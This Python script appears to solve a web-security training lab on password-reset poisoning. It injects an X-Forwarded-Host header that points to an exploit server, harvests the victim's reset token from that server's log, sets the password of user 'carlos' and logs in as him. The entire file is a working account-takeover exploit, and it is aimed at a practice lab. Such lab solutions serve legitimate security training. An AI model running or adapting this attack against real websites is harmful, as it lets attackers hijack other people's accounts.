import requests
import sys
from bs4 import BeautifulSoup
import re



def find_exploit_server(url, session):
    response = session.get(url, timeout=10)
    if "exploit-link" in response.text:
        soup = BeautifulSoup(response.text, "html.parser")
        exploit_server_url = soup.find("a", {"id": "exploit-link"}).get("href")
        return exploit_server_url


def reset_password(url, session, exploit_server_url):
    # Sending forgot password request with X-Forwarded-Host header pointing to the exploit server
    session.post(f"{url}/forgot-password", data={"username": "carlos"}, headers={"X-Forwarded-Host": exploit_server_url.replace("https://", "")})

    # Retrieving password reset link from exploit server log
    exploit_server_log_response = session.get(f"{exploit_server_url}/log", timeout=10)
    forgot_password_token = re.findall("/forgot-password\?temp-forgot-password-token=([a-zA-Z0-9]+)", exploit_server_log_response.text)[-1]

    # Resetting Carlos's password
    data = {"temp-forgot-password-token": forgot_password_token, "new-password-1": "pass", "new-password-2": "pass"}
    response = session.post(f"{url}/forgot-password?temp-forgot-password-token={forgot_password_token}", data=data, timeout=10)
    return response.status_code == 200


def login(url, session):
    response = session.post(f"{url}/login", data={"username": "carlos", "password": "pass"}, timeout=10)
    return "Your username is: carlos" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))


        print("(+) Finding exploit server...")
        exploit_server = find_exploit_server(url, session)
        if not exploit_server:
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Resetting Carlos's password...")
        if not reset_password(url, session, exploit_server):
            print("(-) Something went wrong.")
            sys.exit(1)

        print("(+) Logging in...")
        if login(url, session):
            print("(+) Lab successfully solved!")
        else:
            print("(-) Something went wrong.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()